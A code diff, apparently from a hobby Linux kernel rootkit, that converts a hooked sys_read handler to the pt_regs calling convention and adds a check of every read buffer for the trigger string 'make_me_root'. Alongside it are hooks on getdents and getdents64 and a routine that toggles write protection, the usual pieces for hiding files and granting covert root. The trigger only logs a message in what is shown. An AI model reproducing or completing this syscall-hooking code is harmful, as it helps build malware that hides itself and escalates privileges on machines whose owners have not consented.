@@ -19,7 +19,7 @@ atomic_t read_count;
 atomic_t getdents_count;
 atomic_t getdents64_count;
 
-asmlinkage ssize_t (*sys_read)(int, void *, size_t);
+asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
 asmlinkage long (*sys_getdents)(const struct pt_regs *);
 asmlinkage long (*sys_getdents64)(const struct pt_regs *);
 
@@ -95,10 +95,16 @@ enable_protection(void)
 
 
 asmlinkage ssize_t
-g7_read(int fd, void *buf, size_t count)
+g7_read(const struct pt_regs *pt_regs)
 {
-    DEBUG_INFO("testing g7_read\n");
-    return sys_read(fd, buf, count);
+    int fd = (int)pt_regs->di;
+    void *buf = (void *)pt_regs->si;
+    size_t count = (size_t)pt_regs->dx;
+
+    if (!memcmp((const char *)buf, "make_me_root", count))
+        DEBUG_INFO("YEP");
+
+    return sys_read(pt_regs);
 }
 
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
